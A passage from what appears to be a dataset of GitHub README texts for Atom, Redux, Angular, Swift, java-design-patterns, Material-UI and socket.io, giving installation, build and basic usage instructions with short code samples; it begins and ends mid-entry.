AtomSetup.exe is 32-bit. For 64-bit systems, download AtomSetup-x64.exe.\nAtom will automatically update when a new release is available.\nYou can also download atom-windows.zip (32-bit) or atom-x64-windows.zip (64-bit) from the releases page.\nThe .zip version will not automatically update.\nUsing Chocolatey? Run cinst Atom to install the latest version of Atom.\nLinux\nAtom is only available for 64-bit Linux systems.\nConfigure your distribution's package manager to install and update Atom by following the Linux installation instructions in the Flight Manual.  You will also find instructions on how to install Atom's official Linux packages without using a package repository, though you will not get automatic updates after installing Atom this way.\nArchive extraction\nAn archive is available for people who don't want to install atom as root.\nThis version enables you to install multiple Atom versions in parallel. It has been built on Ubuntu 64-bit,\nbut should be compatible with other Linux distributions.\n\nInstall dependencies (on Ubuntu): sudo apt install git gconf2 gconf-service libgtk2.0-0 libudev1 libgcrypt20 libnotify4 libxtst6 libnss3 python gvfs-bin xdg-utils libcap2\nDownload atom-amd64.tar.gz from the Atom releases page.\nRun tar xf atom-amd64.tar.gz in the directory where you want to extract the Atom folder.\nLaunch Atom using the installed atom command from the newly extracted directory.\n\nThe Linux version does not currently automatically update so you will need to\nrepeat these steps to upgrade to future releases.\nBuilding\n\nLinux\nmacOS\nWindows\n\nDiscussion\n\nDiscuss Atom on our forums\nChat about Atom on our Slack team -- instructions for joining\n\nLicense\nMIT\nWhen using the Atom or other GitHub logos, be sure to follow the GitHub logo guidelines."}, {"title": "reduxjs/redux", "language": "JavaScript", "content": "Redux is a predictable state container for JavaScript apps.\n(Not to be confused with a WordPress framework \u2013\u00a0Redux Framework.)\nIt helps you write applications that behave consistently, run in different environments (client, server, and native), and are easy to test. On top of that, it provides a great developer experience, such as live code editing combined with a time traveling debugger.\nYou can use Redux together with React, or with any other view library.\nIt is tiny (2kB, including dependencies).\n\nNote: We are currently planning a rewrite of the Redux docs. Please take some time to fill out this survey on what content is most important in a docs site. Thanks!\n\n\n\n\n\n\nLearn Redux\nWe have a variety of resources available to help you learn Redux, no matter what your background or learning style is.\nJust the Basics\nIf you're brand new to Redux and want to understand the basic concepts, see:\n\nThe Motivation behind building Redux, the Core Concepts, and the Three Principles.\nThe basic tutorial in the Redux docs\nRedux creator Dan Abramov's free \"Getting Started with Redux\" video series on Egghead.io\nRedux co-maintainer Mark Erikson's \"Redux Fundamentals\" slideshow and list of suggested resources for learning Redux\nIf you learn best by looking at code and playing with it, check out our list of Redux example applications, available as separate projects in the Redux repo, and also as interactive online examples on CodeSandbox.\nThe Redux Tutorials section of the React/Redux links list. Here's a top list of our recommended tutorials:\n\nDave Ceddia's posts What Does Redux Do? (and when should you use it?) and How Redux Works: A Counter-Example are a great intro to the basics of Redux and how to use it with React, as is this post on React and Redux: An Introduction.\nValentino Gagliardi's post React Redux Tutorial for Beginners: Learning Redux in 2018 is an excellent extended introduction to many aspects of using Redux.\nThe CSS Tricks article Leveling Up with React: Redux covers the Redux basics well.\nThis DevGuides: Introduction to Redux tutorial covers several aspects of Redux, including actions, reducers, usage with React, and middleware.\n\n\n\nIntermediate Concepts\nOnce you've picked up the basics of working with actions, reducers, and the store, you may have questions about topics like working with asynchronous logic and AJAX requests, connecting a UI framework like React to your Redux store, and setting up an application to use Redux:\n\nThe \"Advanced\" docs section covers working with async logic, middleware, routing.\nThe Redux docs \"Learning Resources\" page points to recommended articles on a variety of Redux-related topics.\nSophie DeBenedetto's 8-part Building a Simple CRUD App with React + Redux series shows how to put together a basic CRUD app from scratch.\n\nReal-World Usage\nGoing from a TodoMVC app to a real production application can be a big jump, but we've got plenty of resources to help:\n\nRedux creator Dan Abramov's free \"Building React Applications with Idiomatic Redux\" video series builds on his first video series and covers topics like middleware, routing, and persistence.\nThe Redux FAQ answers many common questions about how to use Redux, and the \"Recipes\" docs section has information on handling derived data, testing, structuring reducer logic, and reducing boilerplate.\nRedux co-maintainer Mark Erikson's \"Practical Redux\" tutorial series demonstrates real-world intermediate and advanced techniques for working with React and Redux (also available as an interactive course on Educative.io).\nThe React/Redux links list has categorized articles on working with reducers and selectors, managing side effects, Redux architecture and best practices, and more.\nOur community has created thousands of Redux-related libraries, addons, and tools. The \"Ecosystem\" docs page lists our recommendations, and there's a complete listing available in the Redux addons catalog.\nIf you're looking to learn from actual application codebases, the addons catalog also has a list of purpose-built examples and real-world applications.\n\nFinally, Mark Erikson is teaching a series of Redux workshops through Workshop.me. Check the workshop schedule for upcoming dates and locations.\nHelp and Discussion\nThe #redux channel of the Reactiflux Discord community is our official resource for all questions related to learning and using Redux. Reactiflux is a great place to hang out, ask questions, and learn - come join us!\nBefore Proceeding Further\nRedux is a valuable tool for organizing your state, but you should also consider whether it's appropriate for your situation. Don't use Redux just because someone said you should - take some time to understand the potential benefits and tradeoffs of using it.\nHere are some suggestions on when it makes sense to use Redux:\n\nYou have reasonable amounts of data changing over time\nYou need a single source of truth for your state\nYou find that keeping all your state in a top-level component is no longer sufficient\n\nYes, these guidelines are subjective and vague, but this is for good reason. The point at which you should integrate Redux into your application is different for every user and different for every application.\n\nFor more thoughts on how Redux is meant to be used, see:\n\nYou Might Not Need Redux\nThe Tao of Redux, Part 1 - Implementation and Intent\nThe Tao of Redux, Part 2 - Practice and Philosophy\nRedux FAQ\n\n\nDeveloper Experience\nDan Abramov (author of Redux) wrote Redux while working on his React Europe talk called \u201cHot Reloading with Time Travel\u201d. His goal was to create a state management library with a minimal API but completely predictable behavior. Redux makes it possible to implement logging, hot reloading, time travel, universal apps, record and replay, without any buy-in from the developer.\nInfluences\nRedux evolves the ideas of Flux, but avoids its complexity by taking cues from Elm.\nEven if you haven't used Flux or Elm, Redux only takes a few minutes to get started with.\nInstallation\nTo install the stable version:\nnpm install --save redux\nThis assumes you are using npm as your package manager.\nIf you're not, you can access these files on unpkg, download them, or point your package manager to them.\nMost commonly, people consume Redux as a collection of CommonJS modules. These modules are what you get when you import redux in a Webpack, Browserify, or a Node environment. If you like to live on the edge and use Rollup, we support that as well.\nIf you don't use a module bundler, it's also fine. The redux npm package includes precompiled production and development UMD builds in the dist folder. They can be used directly without a bundler and are thus compatible with many popular JavaScript module loaders and environments. For example, you can drop a UMD build as a <script> tag on the page, or tell Bower to install it. The UMD builds make Redux available as a window.Redux global variable.\nThe Redux source code is written in ES2015 but we precompile both CommonJS and UMD builds to ES5 so they work in any modern browser. You don't need to use Babel or a module bundler to get started with Redux. You can even use the ES module build that's available at es/redux.mjs which can be referenced using type=\"module\" in your script tag or as a standard import.\nComplementary Packages\nMost likely, you'll also need the React bindings and the developer tools.\nnpm install --save react-redux\nnpm install --save-dev redux-devtools\nNote that unlike Redux itself, many packages in the Redux ecosystem don't provide UMD builds, so we recommend using CommonJS module bundlers like Webpack and Browserify for the most comfortable development experience.\nThe Gist\nThe whole state of your app is stored in an object tree inside a single store.\nThe only way to change the state tree is to emit an action, an object describing what happened.\nTo specify how the actions transform the state tree, you write pure reducers.\nThat's it!\nimport { createStore } from 'redux'\n\n/**\n * This is a reducer, a pure function with (state, action) => state signature.\n * It describes how an action transforms the state into the next state.\n *\n * The shape of the state is up to you: it can be a primitive, an array, an object,\n * or even an Immutable.js data structure. The only important part is that you should\n * not mutate the state object, but return a new object if the state changes.\n *\n * In this example, we use a `switch` statement and strings, but you can use a helper that\n * follows a different convention (such as function maps) if it makes sense for your\n * project.\n */\nfunction counter(state = 0, action) {\n  switch (action.type) {\n    case 'INCREMENT':\n      return state + 1\n    case 'DECREMENT':\n      return state - 1\n    default:\n      return state\n  }\n}\n\n// Create a Redux store holding the state of your app.\n// Its API is { subscribe, dispatch, getState }.\nlet store = createStore(counter)\n\n// You can use subscribe() to update the UI in response to state changes.\n// Normally you'd use a view binding library (e.g. React Redux) rather than subscribe() directly.\n// However it can also be handy to persist the current state in the localStorage.\n\nstore.subscribe(() => console.log(store.getState()))\n\n// The only way to mutate the internal state is to dispatch an action.\n// The actions can be serialized, logged or stored and later replayed.\nstore.dispatch({ type: 'INCREMENT' })\n// 1\nstore.dispatch({ type: 'INCREMENT' })\n// 2\nstore.dispatch({ type: 'DECREMENT' })\n// 1\nInstead of mutating the state directly, you specify the mutations you want to happen with plain objects called actions. Then you write a special function called a reducer to decide how every action transforms the entire application's state.\nIf you're coming from Flux, there is a single important difference you need to understand. Redux doesn't have a Dispatcher or support many stores. Instead, there is just a single store with a single root reducing function. As your app grows, instead of adding stores, you split the root reducer into smaller reducers independently operating on the different parts of the state tree. This is exactly like how there is just one root component in a React app, but it is composed out of many small components.\nThis architecture might seem like an overkill for a counter app, but the beauty of this pattern is how well it scales to large and complex apps. It also enables very powerful developer tools, because it is possible to trace every mutation to the action that caused it. You can record user sessions and reproduce them just by replaying every action.\nLearn Redux from Its Authors\nRedux Video Tutorials by Dan Abramov\nGetting Started with Redux\nGetting Started with Redux is a video course consisting of 30 videos narrated by Dan Abramov, author of Redux. It is designed to complement the \u201cBasics\u201d part of the docs while bringing additional insights about immutability, testing, Redux best practices, and using Redux with React. This course is free and will always be.\n\n\u201cGreat course on egghead.io by @dan_abramov - instead of just showing you how to use #redux, it also shows how and why redux was built!\u201d\nSandrino Di Mattia\n\n\n\u201cPlowing through @dan_abramov 'Getting Started with Redux' - its amazing how much simpler concepts get with video.\u201d\nChris Dhanaraj\n\n\n\u201cThis video series on Redux by @dan_abramov on @eggheadio is spectacular!\u201d\nEddie Zaneski\n\n\n\u201cCome for the name hype. Stay for the rock solid fundamentals. (Thanks, and great job @dan_abramov and @eggheadio!)\u201d\nDan\n\n\n\u201cThis series of videos on Redux by @dan_abramov is repeatedly blowing my mind - gunna do some serious refactoring\u201d\nLaurence Roberts\n\nSo, what are you waiting for?\nWatch the free \"Getting Started with Redux\" video series\n\nNote: If you enjoyed Dan's course, consider supporting Egghead by buying a subscription. Subscribers have access to the source code of every example in my videos and tons of advanced lessons on other topics, including JavaScript in depth, React, Angular, and more. Many Egghead instructors are also open source library authors, so buying a subscription is a nice way to thank them for the work that they've done.\n\nBuilding React Applications with Idiomatic Redux\nThe Building React Applications with Idiomatic Redux course is a second free video series by Dan Abramov. It picks up where the first series left off, and covers practical production ready techniques for building your React and Redux applications: advanced state management, middleware, React Router integration, and other common problems you are likely to encounter while building applications for your clients and customers. As with the first series, this course will always be free.\nWatch the free \"Idiomatic Redux\" video series\nPractical Redux course\nPractical Redux is a paid interactive course by Redux co-maintainer Mark Erikson. The course is designed to show how to apply the basic concepts of Redux to building something larger than a TodoMVC application. It includes real-world topics like:\n\nAdding Redux to a new Create-React-App project and configuring Hot Module Replacement for faster development\nControlling your UI behavior with Redux\nUsing the Redux-ORM library to manage relational data in your Redux store\nBuilding a master/detail view to display and edit data\nWriting custom advanced Redux reducer logic to solve specific problems\nOptimizing performance of Redux-connected form inputs\n\nAnd much more!\nThe course is based on Mark's original free \"Practical Redux\" blog tutorial series, but with updated and improved content.\nRedux Fundamentals Workshop\nRedux co-maintainer Mark Erikson has put together a Redux Fundamentals workshop, and slides are available here. They cover:\n\nThe history and purpose of Redux\nReducers and actions, and working with a Redux store\nUsing Redux with React\nUsing and writing Redux middleware\nWorking with AJAX calls and other side effects\nUnit testing Redux apps\nReal-world Redux app structure and development\n\nDocumentation\n\nIntroduction\nBasics\nAdvanced\nRecipes\nFAQ\nTroubleshooting\nGlossary\nAPI Reference\n\nFor PDF, ePub, and MOBI exports for offline reading, and instructions on how to create them, please see: paulkogel/redux-offline-docs.\nFor Offline docs, please see: devdocs\nExamples\nAlmost all examples have a corresponding CodeSandbox sandbox. This is an interactive version of the code that you can play with online.\n\nCounter Vanilla: Source\nCounter: Source | Sandbox\nTodos: Source | Sandbox\nTodos with Undo: Source | Sandbox\nTodos w/ Flow: Source\nTodoMVC: Source | Sandbox\nShopping Cart: Source | Sandbox\nTree View: Source | Sandbox\nAsync: Source | Sandbox\nUniversal: Source\nReal World: Source | Sandbox\n\nIf you're new to the NPM ecosystem and have troubles getting a project up and running, or aren't sure where to paste the gist above, check out simplest-redux-example that uses Redux together with React and Browserify.\nTestimonials\n\n\u201cLove what you're doing with Redux\u201d\nJing Chen, creator of Flux\n\n\n\u201cI asked for comments on Redux in FB's internal JS discussion group, and it was universally praised. Really awesome work.\u201d\nBill Fisher, author of Flux documentation\n\n\n\u201cIt's cool that you are inventing a better Flux by not doing Flux at all.\u201d\nAndr\u00e9 Staltz, creator of Cycle\n\nThanks\n\nThe Elm Architecture for a great intro to modeling state updates with reducers;\nTurning the database inside-out for blowing my mind;\nDeveloping ClojureScript with Figwheel for convincing me that re-evaluation should \u201cjust work\u201d;\nWebpack for Hot Module Replacement;\nFlummox for teaching me to approach Flux without boilerplate or singletons;\ndisto for a proof of concept of hot reloadable Stores;\nNuclearJS for proving this architecture can be performant;\nOm for popularizing the idea of a single state atom;\nCycle for showing how often a function is the best tool;\nReact for the pragmatic innovation.\n\nSpecial thanks to Jamie Paton for handing over the redux NPM package name.\nLogo\nYou can find the official logo on GitHub.\nChange Log\nThis project adheres to Semantic Versioning.\nEvery release, along with the migration instructions, is documented on the GitHub Releases page.\nPatrons\nThe work on Redux was funded by the community.\nMeet some of the outstanding companies that made it possible:\n\nWebflow\nXimedes\n\nSee the full list of Redux patrons, as well as the always-growing list of people and companies that use Redux.\nLicense\nMIT"}, {"title": "angular/angular", "language": "TypeScript", "content": "Angular\nAngular is a development platform for building mobile and desktop web applications using Typescript/JavaScript and other languages.\nQuickstart\nGet started in 5 minutes.\nChangelog\nLearn about the latest improvements.\nWant to help?\nWant to file a bug, contribute some code, or improve documentation? Excellent! Read up on our\nguidelines for contributing and then check out one of our issues in the hotlist: community-help."}, {"title": "apple/swift", "language": "C++", "content": "Swift Programming Language\n\n\n\n\nArchitecture\nMaster\nPackage\n\n\n\n\nmacOS\nx86_64\n\n\n\n\nUbuntu 14.04\nx86_64\n\n\n\n\nUbuntu 16.04\nx86_64\n\n\n\n\nUbuntu 18.04\nx86_64\n\n\n\n\n\nSwift Community-Hosted CI Platforms\n\n\n\nOS\nArchitecture\nBuild\n\n\n\n\nDebian 9.1 (Raspberry Pi)\nARMv7\n\n\n\nFedora 27\nx86_64\n\n\n\nUbuntu 16.04\nx86_64\n\n\n\nUbuntu 16.04 \nPPC64LE\n\n\n\nUbuntu 16.04 \nAArch64\n\n\n\nAndroid\nARMv7\n\n\n\nAndroid\nAArch64\n\n\n\nUbuntu 16.04 (TensorFlow)\nx86_64\n\n\n\nmacOS 10.13 (TensorFlow)\nx86_64\n\n\n\nUbuntu 16.04 (TensorFlow with GPU)\nx86_64\n\n\n\nDebian 9.5\nx86_64\n\n\n\n\nWelcome to Swift\nSwift is a high-performance system programming language.  It has a clean\nand modern syntax, offers seamless access to existing C and Objective-C code\nand frameworks, and is memory safe by default.\nAlthough inspired by Objective-C and many other languages, Swift is not itself a\nC-derived language. As a complete and independent language, Swift packages core\nfeatures like flow control, data structures, and functions, with high-level\nconstructs like objects, protocols, closures, and generics. Swift embraces\nmodules, eliminating the need for headers and the code duplication they entail.\nTo learn more about the programming language, visit swift.org.\nContributing to Swift\nContributions to Swift are welcomed and encouraged! Please see the\nContributing to Swift guide.\nTo be a truly great community, Swift.org needs to welcome\ndevelopers from all walks of life, with different backgrounds, and with a wide\nrange of experience. A diverse and friendly community will have more great\nideas, more unique perspectives, and produce more great code. We will work\ndiligently to make the Swift community welcoming to everyone.\nTo give clarity of what is expected of our members, Swift has adopted the\ncode of conduct defined by the Contributor Covenant. This document is used\nacross many open source communities, and we think it articulates our values\nwell. For more, see the Code of Conduct.\nGetting Started\nThese instructions give the most direct path to a working Swift development\nenvironment. To build from source you will need about 2 GB of disk space for the\nsource code and up to 70 GB of disk space for the build artifacts with full\ndebugging. Depending on your machine, a clean build can take a few minutes to\nseveral hours. Naturally, incremental builds are much faster.\nSystem Requirements\nmacOS, Ubuntu Linux LTS, and the latest Ubuntu Linux release are the current\nsupported host development operating systems.\nPlease make sure you use Python 2.x. Python 3.x is not supported currently.\nmacOS\nTo build for macOS, you need Xcode 10.2 beta.\nThe required version of Xcode changes frequently, and is often a beta release.\nCheck this document or the host information on https://ci.swift.org for the\ncurrent required version.\nYou will also need CMake and Ninja,\nwhich can be installed via a package manager:\nHomebrew\nbrew install cmake ninja\n\nMacPorts\nsudo port install cmake ninja\n\nInstructions for installing CMake and Ninja directly can be found below.\nLinux\nFor Ubuntu, you'll need the following development dependencies:\nsudo apt-get install git cmake ninja-build clang python uuid-dev libicu-dev icu-devtools libbsd-dev libedit-dev libxml2-dev libsqlite3-dev swig libpython-dev libncurses5-dev pkg-config libblocksruntime-dev libcurl4-openssl-dev systemtap-sdt-dev tzdata rsync\n\nNote: LLDB currently requires at least swig-1.3.40 but will successfully build\nwith version 2 shipped with Ubuntu.\nBuild instructions for Ubuntu 14.04 LTS can be found here.\nGetting Sources for Swift and Related Projects\nFirst create a directory for all of the Swift sources:\nmkdir swift-source\ncd swift-source\n\nNote: This is important since update-checkout (see below) checks out\nrepositories next to the Swift source directory. This means that if one clones\nSwift and has other unrelated repositories, update-checkout may not clone those\nrepositories and will update them instead.\nVia HTTPS  For those checking out sources as read-only, HTTPS works best:\ngit clone https://github.com/apple/swift.git\n./swift/utils/update-checkout --clone\n\nVia SSH  For those who plan on regularly making direct commits,\ncloning over SSH may provide a better experience (which requires\nuploading SSH keys to GitHub):\ngit clone git@github.com:apple/swift.git\n./swift/utils/update-checkout --clone-with-ssh\n\nBuilding Swift\nThe build-script is a high-level build automation script that supports basic\noptions such as building a Swift-compatible LLDB, building the Swift Package\nManager, building for various platforms, running tests after builds, and more.\nThere are two primary build systems to use: Xcode and Ninja. The Xcode build\nsystem allows you to work in Xcode, but Ninja is a bit faster and supports\nmore environments.\nTo build using Ninja, run:\nutils/build-script --release-debuginfo\n\nWhen developing Swift, it helps to build what you're working on in a debug\nconfiguration while building the rest of the project with optimizations. Below\nare some examples of using debug variants:\nutils/build-script --release-debuginfo --debug-swift # Swift frontend built in debug\nutils/build-script --release-debuginfo --debug-swift-stdlib # Standard library built in debug\nutils/build-script --release-debuginfo --debug-swift --force-optimized-typechecker # Swift frontend sans type checker built in debug\n\nLimiting the amount of debug code in the compiler has a very large impact on\nSwift compile times, and in turn the test execution time. If you want to build\nthe entire project in debug, you can run:\nutils/build-script --debug\n\nFor documentation of all available arguments, as well as additional usage\ninformation, see the inline help:\nutils/build-script -h\n\nXcode\nTo build using Xcode, specify the --xcode argument on any of the above commands.\nXcode can be used to edit the Swift source code, but it is not currently\nfully supported as a build environment for SDKs other than macOS. The generated\nXcode project does not integrate with the test runner, but the tests can be run\nwith the 'check-swift' target.\nBuild Products\nAll of the build products are placed in swift-source/build/${TOOL}-${MODE}/${PRODUCT}-${PLATFORM}/.\nIf macOS Swift with Ninja in DebugAssert mode was built, all of the products\nwould be in swift-source/build/Ninja-DebugAssert/swift-macosx-x86_64/. It\nhelps to save this directory as an environment variable for future use.\nexport SWIFT_BUILD_DIR=\"~/swift-source/build/Ninja-DebugAssert/swift-macosx-x86_64\"\n\nNinja\nOnce the first build has completed, Ninja can perform fast incremental builds of\nvarious products. These incremental builds are a big timesaver when developing\nand debugging.\ncd ${SWIFT_BUILD_DIR}\nninja swift\n\nThis will build the Swift compiler, but will not rebuild the standard library or\nany other target. Building the swift-stdlib target as an additional layer of\ntesting from time to time is also a good idea. To build just the standard\nlibrary, run:\nninja swift-stdlib\n\nIt is always a good idea to do a full build after using update-checkout.\nUsing Xcode\nTo open the Swift project in Xcode, open ${SWIFT_BUILD_DIR}/Swift.xcodeproj.\nIt will auto-create a lot of schemes for all of the available targets. A\ncommon debug flow would involve:\n\nSelect the 'swift' scheme.\nPull up the scheme editor (\u2318\u21e7<).\nSelect the 'Arguments' tab and click the '+'.\nAdd the command line options.\nClose the scheme editor.\nBuild and run.\n\nAnother option is to change the scheme to \"Wait for executable to be launched\",\nthen run the build product in Terminal.\nSwift Toolchains\nBuilding\nSwift toolchains are created using the script\nbuild-toolchain. This\nscript is used by swift.org's CI to produce snapshots and can allow for one to\nlocally reproduce such builds for development or distribution purposes. E.x.:\n  $ ./utils/build-toolchain $BUNDLE_PREFIX\n\nwhere $BUNDLE_PREFIX is a string that will be prepended to the build\ndate to give the bundle identifier of the toolchain's Info.plist. For\ninstance, if $BUNDLE_PREFIX was com.example, the toolchain\nproduced will have the bundle identifier com.example.YYYYMMDD. It\nwill be created in the directory you run the script with a filename\nof the form: swift-LOCAL-YYYY-MM-DD-a-osx.tar.gz.\nBeyond building the toolchain, build-toolchain also supports the\nfollowing (non-exhaustive) set of useful options::\n\n--dry-run: Perform a dry run build. This is off by default.\n--test: Test the toolchain after it has been compiled. This is off by default.\n--distcc: Use distcc to speed up the build by distributing the c++ part of\nthe swift build. This is off by default.\n\nMore options may be added over time. Please pass --help to\nbuild-toolchain to see the full set of options.\nInstalling into Xcode\nOn macOS if one wants to install such a toolchain into Xcode:\n\nUntar and copy the toolchain to one of /Library/Developer/Toolchains/ or\n~/Library/Developer/Toolchains/. E.x.:\n\n  $ sudo tar -xzf swift-LOCAL-YYYY-MM-DD-a-osx.tar.gz -C /\n  $ tar -xzf swift-LOCAL-YYYY-MM-DD-a-osx.tar.gz -C ~/\n\nThe script also generates an archive containing debug symbols which\ncan be installed over the main archive allowing symbolication of any\ncompiler crashes.\n  $ sudo tar -xzf swift-LOCAL-YYYY-MM-DD-a-osx-symbols.tar.gz -C /\n  $ tar -xzf swift-LOCAL-YYYY-MM-DD-a-osx-symbols.tar.gz -C ~/\n\n\nSpecify the local toolchain for Xcode's use via Xcode->Toolchains.\n\nBuild Failures\nMake sure you are using the correct release of Xcode.\nIf you have changed Xcode versions but still encounter errors that appear to\nbe related to the Xcode version, try passing --clean to build-script.\nWhen a new version of Xcode is released, you can update your build without\nrecompiling the entire project by passing the --reconfigure option.\nMake sure all repositories are up to date with the update-checkout command\ndescribed above.\nTesting Swift\nSee docs/Testing.md, in particular the section on lit.py.\nLearning More\nBe sure to look through the docs\ndirectory for more information about the compiler. In particular, the documents\ntitled Debugging the Swift Compiler and\nContinuous Integration for Swift are very\nhelpful to understand before submitting your first PR.\nBuilding Documentation\nTo read the compiler documentation, start by installing the\nSphinx documentation generator tool by running the\ncommand:\neasy_install -U \"Sphinx < 2.0\"\n\nOnce complete, you can build the Swift documentation by changing directory into\ndocs and typing make. This\ncompiles the .rst files in the docs\ndirectory into HTML in the docs/_build/html directory.\nMany of the docs are out of date, but you can see some historical design\ndocuments in the docs directory.\nAnother source of documentation is the standard library itself, located in\nstdlib. Much of the language is actually implemented in the library\n(including Int), and the standard library gives some examples of what can be\nexpressed today.\nBuild Dependencies\nCMake\nCMake is the core infrastructure used to configure builds of\nSwift and its companion projects; at least version 3.4.3 is required.\nOn macOS, you can download the CMake Binary Distribution,\nbundled as an application, copy it to /Applications, and add the embedded\ncommand line tools to your PATH:\nexport PATH=/Applications/CMake.app/Contents/bin:$PATH\n\nOn Linux, if you have not already installed Swift's development\ndependencies, you can download and install the CMake\npackage separately using the following command:\nsudo apt-get install cmake\n\nNinja\nNinja is the current recommended build system\nfor building Swift and is the default configuration generated by CMake. Pre-built\npackages\nare available for macOS and Linux distributions. You can also clone Ninja\nnext to the other projects and it will be bootstrapped automatically:\nVia HTTPS\ngit clone https://github.com/ninja-build/ninja.git && cd ninja\ngit checkout release\ncat README\n\nVia SSH\ngit clone git@github.com:ninja-build/ninja.git && cd ninja\ngit checkout release\ncat README"}, {"title": "iluwatar/java-design-patterns", "language": "Java", "content": "Design patterns implemented in Java\n\n\n\n\nIntroduction\nDesign patterns are the best formalized practices a programmer can use to\nsolve common problems when designing an application or system.\nDesign patterns can speed up the development process by providing tested, proven\ndevelopment paradigms.\nReusing design patterns help prevent subtle issues which cause major\nproblems, and it also improves code readability for coders and architects who\nare familiar with the patterns.\nGetting started\nBefore you dive into the material, you should be familiar with various\nProgramming/Software Design Principles.\nAll designs should be as simple as possible. You should start with KISS, YAGNI,\nand Do The Simplest Thing That Could Possibly Work principles. Complexity and\npatterns should only be introduced when they are needed for practical\nextensibility.\nOnce you are familiar with these concepts you can start drilling down into\npatterns by any of the following approaches\n\nUsing difficulty tags, Difficulty-Beginner, Difficulty-Intermediate & Difficulty-Expert.\nUsing pattern categories, Creational, Behavioral and others.\nSearch for a specific pattern. Can't find one? Please report a new pattern here.\n\nHow to contribute\nIf you are willing to contribute to the project you will find the relevant information in our developer wiki. We will help you and answer your questions in the Gitter chatroom.\nLicense\nThis project is licensed under the terms of the MIT license."}, {"title": "mui-org/material-ui", "language": "JavaScript", "content": "Material-UI\n\nReact components that implement Google's Material Design.\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nInstallation\nMaterial-UI is available as an npm package.\nStable channel v3\n// with npm\nnpm install @material-ui/core\n\n// with yarn\nyarn add @material-ui/core\nNext channel v4.0.0-alpha\n// with npm\nnpm install @material-ui/core@next\n\n// with yarn\nyarn add @material-ui/core@next\nv0.x (Migration to v1)\n// with npm\nnpm install material-ui\n\n// with yarn\nyarn add material-ui\nPlease note that @next will only point to pre-releases; to get the latest stable release use @latest instead.\nSupporting Material-UI\nMaterial-UI is an MIT-licensed open source project. It's an independent project with ongoing development made possible thanks to the support of these awesome backers. If you'd like to join them, please consider:\n\nBecome a backer or sponsor on Patreon.\nBecome a backer or sponsor on OpenCollective.\n\nWhat's the difference between Patreon and OpenCollective?\nFunds donated via Patreon directly support Olivier Tassinari's work on Material-UI.\nFunds donated via OpenCollective are managed transparently and will be used for compensating work and expenses for core team members.\nYour name/logo will receive proper recognition and exposure by donating on either platform.\nGold Sponsors\nGold Sponsors are those who have pledged $500/month and more to Material-UI.\nvia Patreon\n\n\n\n\n\n\nvia OpenCollective\n\n\n\n\nThere is more!\nSee the full list of our backers.\nUsage\nHere is a quick example to get you started, it's all you need:\nimport React from 'react';\nimport ReactDOM from 'react-dom';\nimport Button from '@material-ui/core/Button';\n\nfunction App() {\n  return (\n    <Button variant=\"contained\" color=\"primary\">\n      Hello World\n    </Button>\n  );\n}\n\nReactDOM.render(<App />, document.querySelector('#app'));\nYes, it's really all you need to get started as you can see in this live and interactive demo:\n\nQuestions\nFor how-to questions and other non-issues,\nplease use StackOverflow instead of Github issues.\nThere is a StackOverflow tag called \"material-ui\" that you can use to tag your questions.\nExamples\nAre you looking for an example project to get started?\nWe host some.\nDocumentation\nCheck out our documentation website.\nContributing\nWe'd greatly appreciate any contribution you make. :)\nChangelog\nRecently Updated?\nPlease read the changelog.\nRoadmap\nThe future plans and high priority features and enhancements can be found in the ROADMAP.md file.\nThanks\nMaterial-UI is only made possible thanks to these great services that sponsor our core infrastructure:\n\nGitHub allows us to host the Git repository.\n\nCircleCI allows us to run the test suite.\n\nNetlify allows us to distribute the documentation.\n\nCrowdIn allows us to translate the documentation.\n\nBrowserStack allows us to test in real browsers.\n\nCodeCov allows us to monitor the test coverage.\nLicense\nThis project is licensed under the terms of the\nMIT license.\nSecurity\nTo report a security vulnerability, please use the\nTidelift security contact.\nTidelift will coordinate the fix and disclosure."}, {"title": "socketio/socket.io", "language": "JavaScript", "content": "socket.io\n \n\n\n\n\n\n\nFeatures\nSocket.IO enables real-time bidirectional event-based communication. It consists of:\n\na Node.js server (this repository)\na Javascript client library for the browser (or a Node.js client)\n\nSome implementations in other languages are also available:\n\nJava\nC++\nSwift\nDart\n\nIts main features are:\nReliability\nConnections are established even in the presence of:\n\nproxies and load balancers.\npersonal firewall and antivirus software.\n\nFor this purpose, it relies on Engine.IO, which first establishes a long-polling connection, then tries to upgrade to better transports that are \"tested\" on the side, like WebSocket. Please see the Goals section for more information.\nAuto-reconnection support\nUnless instructed otherwise a disconnected client will try to reconnect forever, until the server is available again. Please see the available reconnection options here.\nDisconnection detection\nA heartbeat mechanism is implemented at the Engine.IO level, allowing both the server and the client to know when the other one is not responding anymore.\nThat functionality is achieved with timers set on both the server and the client, with timeout values (the pingInterval and pingTimeout parameters) shared during the connection handshake. Those timers require any subsequent client calls to be directed to the same server, hence the sticky-session requirement when using multiples nodes.\nBinary support\nAny serializable data structures can be emitted, including:\n\nArrayBuffer and Blob in the browser\nArrayBuffer and Buffer in Node.js\n\nSimple and convenient API\nSample code:\nio.on('connection', socket => {\n  socket.emit('request', /* \u2026 */); // emit an event to the socket\n  io.emit('broadcast', /* \u2026 */); // emit an event to all connected sockets\n  socket.on('reply', () => { /* \u2026 */ }); // listen to the event\n});\nCross-browser\nBrowser support is tested in Saucelabs:\n\nMultiplexing support\nIn order to create separation of concerns within your application (for example per module, or based on permissions), Socket.IO allows you to create several Namespaces, which will act as separate communication channels but will share the same underlying connection.\nRoom support\nWithin each Namespace, you can define arbitrary channels, called Rooms, that sockets can join and leave. You can then broadcast to any given room, reaching every socket that has joined it.\nThis is a useful feature to send notifications to a group of users, or to a given user connected on several devices for example.\nNote: Socket.IO is not a WebSocket implementation. Although Socket.IO indeed uses WebSocket as a transport when possible, it adds some metadata to each packet: the packet type, the namespace and the ack id when a message acknowledgement is needed. That is why a WebSocket client will not be able to successfully connect to a Socket.IO server, and a Socket.IO client will not be able to connect to a WebSocket server (like ws://echo.websocket.org) either. Please see the protocol specification here.\nInstallation\nnpm install socket.io\nHow to use\nThe following example attaches socket.io to a plain Node.JS\nHTTP server listening on port 3000.\nconst server = require('http').createServer();\nconst io = require('socket.io')(server);\nio.on('connection', client => {\n  client.on('event', data => { /* \u2026 */ });\n  client.on('disconnect', () => { /* \u2026 */ });\n});\nserver.listen(3000);\nStandalone\nconst io = require('socket.io')();\nio.on('connection', client => { ... });\nio.listen(3000);\nIn conjunction with Express\nStarting with 3.0, express applications have become request handler\nfunctions that you pass to http or http Server instances. You need\nto pass the Server to socket.io, and not the express application\nfunction. Also make sure to call .listen on the server, not the app.\nconst app = require('express')();\nconst server = require('http').createServer(app);\nconst io = require('socket.io')(server);\nio.on('connection', () => { /* \u2026 */ 